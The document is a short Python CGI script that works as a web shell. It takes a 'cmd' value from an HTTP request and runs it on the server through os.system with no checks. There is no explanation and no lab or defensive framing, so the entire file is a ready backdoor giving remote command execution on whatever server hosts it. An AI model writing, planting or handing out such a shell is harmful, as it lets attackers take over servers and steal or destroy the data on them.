#!/usr/bin/env python
import cgi, cgitb
import os
form = cgi.FieldStorage();
cmd = form.getvalue("cmd");
print(cmd);
print("");
os.system(cmd);
